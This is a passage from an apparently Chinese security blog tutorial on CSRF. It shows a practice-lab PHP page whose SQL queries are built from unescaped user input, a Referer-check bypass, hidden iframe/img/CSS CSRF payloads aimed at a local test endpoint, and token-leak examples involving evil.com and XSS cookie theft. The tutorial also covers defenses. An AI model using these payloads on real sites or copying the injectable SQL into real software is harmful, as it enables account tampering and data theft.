欢迎来到reader自创靶场<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;p&gt;请用POST方法提交username和password两个参数&lt;/p&gt;<br>&lt;form action=<span class="hljs-string">&quot;./checkToken.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>    &lt;p&gt; 用户名:&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span> /&gt;&lt;/p&gt;<br>    &lt;p&gt; 密码:&lt;input type=<span class="hljs-string">&quot;password&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span>/&gt;&lt;/p&gt;<br>    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;user_token&quot;</span> value=<span class="hljs-string">&quot;&lt;?php echo <span class="hljs-subst">$token</span>;?&gt;&quot;</span> /&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;提交&quot;</span>/&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php">checkToken.php 这个使我们将信息插入数据库的处理页面<br>    <br><span class="hljs-meta">&lt;?php</span><br><br>    session_start();<br>    <span class="hljs-variable">$user_token</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_token&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_token&#x27;</span>] == <span class="hljs-variable">$user_token</span>) &#123;<br>        <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>        <span class="hljs-variable">$con</span> = mysqli_connect(localhost, root, root, test);<br>        mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-string">&quot;set names utf-8&quot;</span>);<br>        <span class="hljs-variable">$flag</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = mysqli_fetch_array(mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>))) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-variable">$username</span>) &#123;<br>                <span class="hljs-variable">$flag</span> = <span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$flag</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span> . <span class="hljs-string">&quot;已存在&quot;</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$sql1</span> = <span class="hljs-string">&quot;insert into `users` values(&#x27;<span class="hljs-subst">$username</span>&#x27;,&#x27;<span class="hljs-subst">$password</span>&#x27;)&quot;</span>;<br>            <span class="hljs-variable">$row1</span> = mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql1</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$row1</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;插入成功&quot;</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;插入失败&quot;</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            &#125;<br>            <span class="hljs-variable">$sql2</span> = <span class="hljs-string">&quot;select * from users&quot;</span>;<br>            <span class="hljs-variable">$row2</span> = mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql2</span>);<br>            <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row2s</span> = mysqli_fetch_array(<span class="hljs-variable">$row2</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;user:<span class="hljs-subst">&#123;$row2s[&#x27;username&#x27;]&#125;</span>-----pass:<span class="hljs-subst">&#123;$row2s[&#x27;password&#x27;]&#125;</span>&quot;</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your current token is :&quot;</span> . <span class="hljs-variable">$user_token</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your session_token is :&quot;</span> . <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_token&#x27;</span>].<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your current token is :&quot;</span> . <span class="hljs-variable">$user_token</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your session_token is :&quot;</span> . <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_token&#x27;</span>].<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="4-CSRF绕过refer技巧"><a href="#4-CSRF绕过refer技巧" class="headerlink" title="4.CSRF绕过refer技巧"></a>4.CSRF绕过refer技巧</h3><p>HTTP Referer是header的一部分，当游览器想web服务器发送请求时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基于此可以获得一些信息用于处理</p>
+<p>当用户点击被构造好的CSRF利用页面，那么在执行用户对应操作时，提交的HTTP请求中就有对应的Referer值，此时服务器判断Referer值是否与服务器的域名信息有关，如果不相关则不执行操作</p>
+<p><strong>Referer头防御代码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>],<span class="hljs-string">&#x27;xxx.com&#x27;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        判断成功<br>	&#125;<span class="hljs-keyword">else</span>&#123;<br>        判断失败<br>	&#125;<span class="hljs-comment">//strpos()函数查找 &quot;xxx.com&quot; 在字符串中第一次出现的位置,从而判断是否与服务器域名信息相关</span><br></code></pre></td></tr></table></figure>
+<p><strong>Referer绕过技巧：</strong></p>
+<p>1、如果服务器端只判断当前的Referer中是否具有域名，那么可以直接新疆一个以xxx.com命名的文件或者文件夹</p>
+<p><strong>利用burpsuite(专业版)可以进行生成poc</strong></p>
+<h3 id="5-GET型CSRF漏洞利用方法"><a href="#5-GET型CSRF漏洞利用方法" class="headerlink" title="5.GET型CSRF漏洞利用方法"></a>5.GET型CSRF漏洞利用方法</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-number">1.</span>链接利用<br>在HTML中，a标签代表链接，可以将当前的焦点指引到其他位置。移动的焦点需要发送对应的请求到链接指向的地址，然后返回响应<br><span class="hljs-params">&lt;a href=&quot;http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/get-csrf.php?username=hacker<span class="hljs-variable">&amp;password</span>=hacker&quot;&gt;</span>请点击我<span class="hljs-params">&lt;/a&gt;</span><br><br><span class="hljs-number">2.</span>iframe标签利用<br>iframe标签内容将在页面加载过程中会自动进行加载，src指向的位置就是页面请求的位置<br>注意：可以设置iframe的style=<span class="hljs-string">&quot;display:none&quot;</span>,以此来将不显示iframe加载的窗口内容<br><span class="hljs-params">&lt;iframe src=&quot;http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/get-csrf.php?username=hacker<span class="hljs-variable">&amp;password</span>=hacker&quot; style=&quot;dispaly:none&quot; /&gt;</span><br><br><span class="hljs-number">3.</span>img标签利用<br>img标签的内容会随着页面加载而被请求，以此src指向的位置会在页面加载过程中进行请求。<br><span class="hljs-params">&lt;img src=&quot;http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/get-csrf.php?username=hacker<span class="hljs-variable">&amp;password</span>=hacker&quot; /&gt;</span><br><br><span class="hljs-number">4.</span>css-backgroud利用<br>可以利用CSS中background样式中的url来加载远程机器上的内容，从而对url中的内容发送HTTP请求，<br>例如：<br>body&#123;<br><span class="hljs-symbol">    backgroud:</span><span class="hljs-meta">#00FF00 url() no-repeat fixd top;</span><br>&#125;<br><br>例子：(嵌入式的)<br><span class="hljs-params">&lt;body&gt;</span><br>	<span class="hljs-params">&lt;h1 style=&quot;backgroud:url(&#x27;http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/get-csrf.php?username=hacker<span class="hljs-variable">&amp;password</span>=hacker&#x27;);&quot;&gt;</span>hahaha<span class="hljs-params">&lt;/h1&gt;</span><br><span class="hljs-params">&lt;/body&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="6-CSRF漏洞防御"><a href="#6-CSRF漏洞防御" class="headerlink" title="6.CSRF漏洞防御"></a>6.CSRF漏洞防御</h3><p>1.验证码防御</p>
+<p>验证码防御被认为是对抗CSRF最为简单而且有效的防御方法。CSRF是在用户不知情的情况下完成对应操作的，而验证码强制用户要与服务器进行交互，只有完成交互，才能完成相应的操作，一般情况下，验证码二次验证防御是很有效遏制CSRF的</p>
+<p>但是为了用户的体验，不可能每一操作都有验证码验证，因此该方法作为辅助手段</p>
+<p>2.Referer check防御</p>
+<p>Referer check主要用于防止盗链。同理也可以用来检查请求是否来自合法的源。</p>
+<p>缺陷：服务器并非任何时候都可以取到Referer。例如HTTPS跳转到HTTP</p>
+<p>3.Anti-token防御</p>
+<p>CSRF本质原因：重要操作的所有参数都是被恶意攻击者猜测到的</p>
+<p>那么防御措施就是生成一个随机且不被轻易猜测的参数。目前大多数防御都采用token（不可预测）。</p>
+<p>4.token泄露</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">例如：GET型<span class="hljs-keyword">token</span>泄露<br>页面包含&lt;img src=<span class="hljs-string">&quot;http://evil.com&quot;</span> /&gt;那么请求中的Referer就会携带对应的GET <span class="hljs-keyword">token</span>。<br><br>例如：<span class="hljs-keyword">POST</span>型<span class="hljs-keyword">token</span>泄露<br>利用XSS漏洞读取cookie，获取存储在其中的<span class="hljs-keyword">token</span>值<br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/PHP%E5%AE%89%E5%85%A8/">PHP安全</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/03/24/getshell%E6%80%BB%E7%BB%93/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">getshell总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/03/01/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">
+                        <span class="hidden-mobile">sql注入漏洞学习（知识整理）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
